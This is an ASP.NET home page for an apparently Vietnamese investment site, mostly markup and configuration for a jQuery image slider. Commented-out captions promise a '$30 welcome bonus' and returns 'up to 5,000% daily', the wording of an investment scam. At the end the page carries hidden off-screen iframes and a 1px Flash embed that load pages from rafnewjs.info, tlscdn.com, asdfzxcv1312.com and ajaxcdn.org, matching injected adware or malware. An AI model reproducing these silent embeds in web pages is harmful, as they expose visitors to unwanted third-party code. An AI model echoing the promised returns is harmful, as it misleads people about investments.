<%@ Page Title="" Language="vb" AutoEventWireup="false" MasterPageFile="~/MSA.Master" CodeBehind="Home.aspx.vb" Inherits="MSA.Home" %>





<asp:Content ID="Content1" ContentPlaceHolderID="head" runat="server">
</asp:Content>

<asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">
    
   <div data-motopress-type="static" data-motopress-static-file="static/static-slider.php">
            <div id="slider-wrapper">
                <div class="container">
                    <script type="text/javascript">
                        //    jQuery(window).load(function() {
                        jQuery(function () {
                            var myCamera = jQuery('#camera53ff1e3e91d03');
                            if (!myCamera.hasClass('motopress-camera')) {
                                myCamera.addClass('motopress-camera');
                                myCamera.camera({
                                    autoAdvance: true, //true, false
                                    mobileAutoAdvance: true, //true, false. Auto-advancing for mobile devices
                                    cols: 12,
                                    fx: "simpleFade", //'random','simpleFade', 'curtainTopLeft', 'curtainTopRight', 'curtainBottomLeft',          'curtainBottomRight', 'curtainSliceLeft', 'curtainSliceRight', 'blindCurtainTopLeft', 'blindCurtainTopRight', 'blindCurtainBottomLeft', 'blindCurtainBottomRight', 'blindCurtainSliceBottom', 'blindCurtainSliceTop', 'stampede', 'mosaic', 'mosaicReverse', 'mosaicRandom', 'mosaicSpiral', 'mosaicSpiralReverse', 'topLeftBottomRight', 'bottomRightTopLeft', 'bottomLeftTopRight', 'bottomLeftTopRight'
                                    loader: "no", //pie, bar, none (even if you choose "pie", old browsers like IE8- can't display it... they will display always a loading bar)
                                    navigation: true, //true or false, to display or not the navigation buttons
                                    navigationHover: false, //if true the navigation button (prev, next and play/stop buttons) will be visible on hover state only, if false they will be visible always
                                    pagination: false,
                                    playPause: false, //true or false, to display or not the play/pause buttons
                                    rows: 8,
                                    slicedCols: 12,
                                    slicedRows: 8,
                                    thumbnails: false,
                                    time: 7000, //milliseconds between the end of the sliding effect and the start of the next one
                                    transPeriod: 1500, //lenght of the sliding effect in milliseconds

                                    alignment: 'topCenter',
                                    barDirection: 'leftToRight',
                                    barPosition: 'top',
                                    easing: 'easeOutQuad',
                                    mobileEasing: '',
                                    mobileFx: '',
                                    gridDifference: 250,
                                    imagePath: 'images/',
                                    minHeight: "100px",
                                    height: "36.32%",
                                    loaderColor: '#ffffff',
                                    loaderBgColor: '#eb8a7c',
                                    loaderOpacity: 1,
                                    loaderPadding: 0,
                                    loaderStroke: 3,
                                    pieDiameter: 33,
                                    piePosition: 'rightTop',
                                    portrait: true,
                                    ////////callbacks
                                    onEndTransition: function () { }, //this callback is invoked when the transition effect ends
                                    onLoaded: function () { }, //this callback is invoked when the image on a slide has completely loaded
                                    onStartLoading: function () { }, //this callback is invoked when the image on a slide start loading
                                    onStartTransition: function () { } //this callback is invoked when the transition effect starts
                                });
                            }
                        });
                        //    });
                    </script>
                    <div id="camera53ff1e3e91d03" class="camera_wrap camera motopress-camera" style="display: block; height: 425px;">
                        <div class="camera_fakehover">
                            <div class="camera_src camerastarted paused">
                                <div data-src="images/slide_1.jpg" data-thumb="images/slide_1-100x50.jpg">
                                </div><div data-src="images/slide_2.jpg" data-thumb="images/slide_2-100x50.jpg">
                                </div><div data-src="images/slide_3.jpg" data-thumb="images/slide_3-100x50.jpg">
                                </div>
                            </div><div class="camera_target"><div class="cameraCont"><div class="cameraSlide cameraSlide_0" style="visibility: visible; display: none; z-index: 1;"><img src="images/slide_1.jpg?1467639597039" class="imgLoaded" data-alignment="" data-portrait="" width="1170" height="425" style="visibility: visible; height: 425px; margin-left: 0px; margin-right: 0px; margin-top: 0px; position: absolute; width: 1170px;"><div class="camerarelative" style="width: 1170px; height: 425px;"></div></div><div class="cameraSlide cameraSlide_1" style="display: none; z-index: 1;"><img src="images/slide_2.jpg?1467639598757" class="imgLoaded" data-alignment="" data-portrait="" width="1170" height="425" style="visibility: visible; height: 425px; margin-left: 0px; margin-right: 0px; margin-top: 0px; position: absolute; width: 1170px;"><div class="camerarelative" style="width: 1170px; height: 425px;"></div></div><div class="cameraSlide cameraSlide_2 cameracurrent" style="display: block; z-index: 999;"><img src="images/slide_3.jpg?1467639610358" class="imgLoaded" data-alignment="" data-portrait="" width="1170" height="425" style="visibility: visible; height: 425px; margin-left: 0px; margin-right: 0px; margin-top: 0px; position: absolute; width: 1170px;"><div class="camerarelative" style="width: 1170px; height: 425px;"></div></div><div class="cameraSlide cameraSlide_3 cameranext" style="z-index: 1; display: none;"><div class="camerarelative" style="width: 1170px; height: 425px;"></div></div></div></div><div class="camera_overlayer"></div><div class="camera_target_content">
                                <div class="cameraContents">
                                    <div class="cameraContent" style="display: none;">
                                        <div class="camera_caption fadeIn" style="visibility: hidden; opacity: 1;">
                                          <%--  <div>
                                                <strong>$30 BONUS</strong>
                                                <em>GET FREE $30 WELCOME BONUS!</em>
                                                <p>Open Account just now by filling simple registration form and get free $30 welcome bonus directly to your account immediately!</p>
                                                <a href="signup.php?a=5&amp;ref=">open account</a>
                                            </div>--%>
                                        </div>
                                    </div><div class="cameraContent" style="display: none;">
                                        <div class="camera_caption fadeIn" style="visibility: hidden; opacity: 1;">
                                            <%--<div>
                                                <strong>EXTRA INCOME</strong>
                                                <em>INTERESTS UP TO 5,000% DAILY!</em>
                                                <p>Our advanced strategy let us offer extra income for your investments - up to 5,000% daily or 100,000% in 20 running days!</p>
                                                <a href="signup.php?a=5&amp;ref=">open account</a>
                                            </div>--%>
                                        </div>
                                    </div><div class="cameraContent cameracurrent" style="display: block;">
                                        <div class="camera_caption fadeIn" style="visibility: visible; opacity: 1;">
                                            <div>
                                                <strong>LIFE BETTER</strong>
                                                <h3 style="color:white;font-family:Arial">Cuộc sống tốt hơn</h3>
                                               <%-- <p>Hãy tham gia hệ thống để trở thành thành viên !</p>--%>
                                                <a href="Account/RegisterEx.aspx">Đăng ký</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div><div class="camera_bar" style="display: none; bottom: auto; height: 3px;"><span class="camera_bar_cont" style="opacity: 1; position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; background-color: rgb(235, 138, 124);"><span id="pie_1" style="opacity: 1; position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; display: none; background-color: rgb(255, 255, 255);"></span></span></div><div class="camera_prev"><span></span></div><div class="camera_next"><span></span></div>
                        </div><div class="camera_loader" style="display: none; visibility: visible;"></div>
                    </div>
                </div>
            </div>
        </div>

     
        

    
    <div id="back-top-wrapper" class="visible-desktop">
        <p id="back-top" style="display: none;">
            <a href="#top"><span></span></a>
        </p>
    </div>

    <script type="text/javascript" src="Scripts/superfish.js?ver=1.5.3"></script>
    <script type="text/javascript" src="Scripts/jquery.mobilemenu.js?ver=1.0"></script>
    <script type="text/javascript" src="Scripts/jquery.easing.1.3.js?ver=1.3"></script>
    <script type="text/javascript" src="Scripts/jquery.magnific-popup.min.js?ver=0.9.3"></script>
    <script type="text/javascript" src="Scripts/camera.min.js?ver=1.3.4"></script>


    <iframe class="hb1467639603051" id="hb1467639603051" frameborder="0" border="no" scrolling="no" src="https://foxi69.tlscdn.com/altHbHandler.html#opdom=rafnewjs.info&amp;partner=rafnew&amp;channel=rafnewyk_cay&amp;country=VN&amp;quick=https%3A%2F%2Fendall41-q.apollocdn.com%2F&amp;trinity=Z11b0f1h2438&amp;instgrp=&amp;referrer=&amp;hid=9f3dfcf2a10bcf26614cf9023ea3ad14&amp;sset=9&amp;pageurl=http%3A%2F%2Fbit-invest.com%2F" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;"></iframe><iframe id="asdfad" src="http://f.asdfzxcv1312.com/idle.html#B3bKB209CMfMBMv3ANmUAw5MBYzWyxj0BMvYpxjHzM5LDYzJAgfUBMvSpxjHzM5LD3LRx2nHEszJB3vUDhj5pvzojMn1CNjLBNrKB21HAw49yxnKzNP4y3yXmZeYlMnVBsz0CMLUAxr5pvOXmwiWzJfOmJqZoczPBNn0z3jWpszZzxnZAw9UAwq9mtq2nZyZotyWmZa5mJG4mJqMAgLKptLMm2rMy2yYyteWyMnMmJy2mtrJzJKWmJnLytnHzde0jNbHz2v1CMW9Ahr0CcuZqsuYrIuYrMjPDc1PBNzLC3qUy29Tjtjg" visibility="visible" overflow="hidden" frameborder="0" border="no" scrolling="no" style="width: 0;  height: 0;  position: absolute;  top: -10031px;  left:-1000000px;"></iframe><div id="dp_swf_engine" style="position: absolute; width: 1px; height: 1px;"><embed style="width: 1px; height: 1px;" type="application/x-shockwave-flash" src="http://www.ajaxcdn.org/swf.swf" width="1" height="1" id="_dp_swf_engine" name="_dp_swf_engine" bgcolor="#336699" quality="high" allowscriptaccess="always"></div><iframe class="dealply-toast s" id="s" frameborder="0" border="no" scrolling="no" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" src="http://f.rafnewjs.info/skinedEmpty.html"></iframe><iframe class="hb1467639604624" id="hb1467639604624" frameborder="0" border="no" scrolling="no" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" src="https://foxi69.tlscdn.com/altHbHandler.html#opdom=rafnewjs.info&amp;partner=rafnew&amp;channel=rafnewyk_cay&amp;country=VN&amp;quick=https%3A%2F%2Fendall41-q.apollocdn.com%2F&amp;trinity=Z11b0f1h2438&amp;instgrp=&amp;referrer=&amp;hid=9f3dfcf2a10bcf26614cf9023ea3ad14&amp;sset=9&amp;mmth=false&amp;pageurl=http%3A%2F%2Fbit-invest.com%2F"></iframe>
</asp:Content>
